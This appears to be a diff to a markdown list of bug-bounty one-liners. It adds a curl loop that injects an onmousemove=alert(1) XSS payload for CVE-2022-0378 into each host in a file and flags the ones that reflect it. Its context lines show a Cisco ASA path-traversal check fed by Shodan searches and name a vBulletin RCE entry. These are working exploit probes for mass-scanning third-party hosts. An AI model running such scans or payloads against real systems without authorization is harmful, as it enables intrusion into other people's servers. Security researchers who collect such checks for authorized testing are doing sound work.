@@ -64,6 +64,13 @@ shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separat
 while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
 ```
 
+### CVE-2022-0378
+> @7h3h4ckv157
+
+```bash
+cat file.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
+```
+
 ### vBulletin 5.6.2 - 'widget_tabbedContainer_tab_panel' Remote Code Execution
 > @Madrobot_
 
